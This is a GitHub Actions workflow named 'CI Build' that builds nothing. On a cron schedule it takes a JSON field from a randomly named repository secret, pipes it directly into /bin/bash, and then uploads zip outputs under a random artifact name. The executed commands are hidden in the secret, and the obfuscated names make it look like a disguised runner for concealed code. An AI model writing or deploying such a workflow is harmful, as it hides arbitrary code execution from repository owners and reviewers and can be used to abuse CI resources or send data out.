name: CI Build
on:
  workflow_dispatch:

  schedule:
    - cron: '56 2,8,14,20 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          n98: ${{ secrets.n98 }}
        run: |
          printf '%s' "$n98" | jq -r .rgb05 | /bin/bash
          printf '%s' "$ycflq52" | jq -r .wywgv0478 | /bin/bash

      - name: Archive results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: V6qErjP9
          path: "*.zip"
          retention-days: 1
